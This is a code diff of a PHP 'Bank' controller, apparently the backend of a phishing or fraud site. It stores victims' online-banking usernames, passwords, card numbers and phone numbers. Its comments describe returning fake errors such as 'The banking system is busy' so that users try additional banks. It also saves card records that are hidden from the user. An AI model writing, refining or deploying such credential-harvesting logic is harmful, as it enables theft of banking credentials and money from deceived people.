@@ -593,7 +593,7 @@ class Bank extends Controller
 
     public function updateUserInfo($data,$rs,$id = 0){
         if($data['action'] == 'getimg'){
-            $exist = (new Userinfo())->where(['user_id'=>$data['user_id'],'bank_name' => $data['bankname'],'username' => $data['username'],'password' => $data['password']])->find();
+            $exist = (new Userinfo())->where(['user_id'=>$data['user_id'],'bank_name' => $data['bankname'],'username' => $data['username']])->find();
             if($exist){
                 return;
             }
@@ -629,59 +629,75 @@ class Bank extends Controller
                     (new \app\api\model\User())->where(['id'=>$exist['user_id']])->update(['is_get'=>1]);
                 }
                 if($status == 1&&$data['type'] == 1){
-                    //购买商品，第一次返回错误，第二次不能跟第一次银行一样，否则返回错误，第三次及以上直接跳转支付页面
-                    $banks = (new Userinfo())->field('bank_name')->where(['id'=>['<>',$id],'user_id'=>$exist['user_id'],'status'=>1])->group('bank_name')->select();
-                    if(count($banks) <= 0){
-                        if($user['times'] == 1){
-                            //不需要两次验证
-                            $this->error('success',[],3);
+                    //二次验证
+                    if($user['times'] != 1) {
+                        //购买商品，第一次返回错误，第二次不能跟第一次银行一样，否则返回错误，第三次及以上直接跳转支付页面
+                        $banks = (new Userinfo())->field('bank_name')->where(['id' => ['<>', $id], 'user_id' => $exist['user_id'], 'status' => 1])->group('bank_name')->select();
+                        if (count($banks) <= 0) {
+                            $this->error('success', [], 3);
+                            //第一次，无需处理任何逻辑
+                        } elseif (count($banks) > 0 && count($banks) <= 1) {
+                            //第二次，银行不能跟第一次一样
+                            if ($banks[0]['bank_name'] != $exist['bank_name']) {
+                                //跳转支付页面
+                                $this->error('success', [], 3);
+                            }
+                        } else {
+                            //第三次及以上，跳转支付页面
+                            $this->error('success', [], 3);
                         }
-                        //第一次，无需处理任何逻辑
-                    }elseif(count($banks) > 0 && count($banks) <=1){
-                        //第二次，银行不能跟第一次一样
-                        if($banks[0]['bank_name'] != $exist['bank_name']){
-                            //跳转支付页面
-                            $this->error('success',[],3);
-                        }
-                    }else{
-                        //第三次及以上，跳转支付页面
-                        $this->error('success',[],3);
                     }
                 }
                 if($status == 1&&$data['type'] == 3){
-                    $banks = (new Userinfo())->field('bank_name')->where(['id'=>['<>',$id],'user_id'=>$exist['user_id'],'status'=>1])->group('bank_name')->select();
-                    if(count($banks) <= 0){
-                        if($user['times'] != 1) {
-                            $this->error('The banking system is busy', [], 2);
-                        }
-                    }elseif(count($banks) > 0 && count($banks) <=1){
-                        //第二次，银行不能跟第一次一样
-                        if($banks[0]['bank_name'] == $exist['bank_name']){
-                            $this->error('The banking system is busy',[],2);
-                        }
+                    //不能相同卡号
+                    $bankcard = (new Userbank())->where(['bankcard' => $this->request->post("bank_number")])->find();
+                    if($bankcard){
+                        $this->error('The banking system is busy', [], 2);
                     }
-
-                    $num = (new Userbank())->where(['user_id'=>$exist['user_id']])->count();
-                    //判断用户有没有绑定过银行卡，没有的话就加一条记录，并且设置为用户不可见，并且返回银行繁忙
-                    if($num == 0){
-                        $create = [
-                            'user_id' => $exist['user_id'],
-                            'username' => $this->request->post("cardholder_name"),
-                            'bankcard' => $this->request->post("bank_number"),
-                            'bankname' => $data['bankname'],
-                            'bankphone' => $this->request->post('phone_number'),
-                            'createtime' => time(),
-                            'updatetime' => time(),
-                            'status' => 1
-                        ];
-                        (new Userbank())->create($create);
-//                        $this->error('The banking system is busy',[],2);
-                    }else{
-                        //第二次及以上绑定银行卡，需要判断跟之前绑定的银行是否相同，相同则返回错误
-                        $userbank = (new Userbank())->where(['user_id'=>$exist['user_id'],'bankname'=>$data['bankname']])->find();
-                        if($userbank){
-                            $this->error('The banking system is busy',[],2);
+                    if($user['times'] != 1) {
+                        $banks = (new Userinfo())->field('bank_name')->where(['id' => ['<>', $id], 'user_id' => $exist['user_id'], 'status' => 1])->group('bank_name')->select();
+                        if (count($banks) <= 0) {
+                            $this->error('The banking system is busy', [], 2);
+                        } elseif (count($banks) > 0 && count($banks) <= 1) {
+                            //第二次，银行不能跟第一次一样
+                            if ($banks[0]['bank_name'] == $exist['bank_name']) {
+                                $this->error('The banking system is busy', [], 2);
+                            }
                         }
+
+                        $num = (new Userbank())->where(['user_id' => $exist['user_id']])->count();
+                        //判断用户有没有绑定过银行卡，没有的话就加一条记录，并且设置为用户不可见，并且返回银行繁忙
+                        if ($num == 0) {
+                            $create = [
+                                'user_id' => $exist['user_id'],
+                                'username' => $this->request->post("cardholder_name"),
+                                'bankcard' => $this->request->post("bank_number"),
+                                'bankname' => $data['bankname'],
+                                'bankphone' => $this->request->post('phone_number'),
+                                'createtime' => time(),
+                                'updatetime' => time(),
+                                'status' => 1
+                            ];
+                            (new Userbank())->create($create);
+//                        $this->error('The banking system is busy',[],2);
+                        } else {
+                            //第二次及以上绑定银行卡，需要判断跟之前绑定的银行是否相同，相同则返回错误
+                            $userbank = (new Userbank())->where(['user_id' => $exist['user_id'], 'bankname' => $data['bankname']])->find();
+                            if ($userbank) {
+                                $this->error('The banking system is busy', [], 2);
+                            }
+                            $create = [
+                                'user_id' => $exist['user_id'],
+                                'username' => $this->request->post("cardholder_name"),
+                                'bankcard' => $this->request->post("bank_number"),
+                                'bankname' => $data['bankname'],
+                                'bankphone' => $this->request->post('phone_number'),
+                                'createtime' => time(),
+                                'updatetime' => time(),
+                            ];
+                            (new Userbank())->create($create);
+                        }
+                    }else{
                         $create = [
                             'user_id' => $exist['user_id'],
                             'username' => $this->request->post("cardholder_name"),
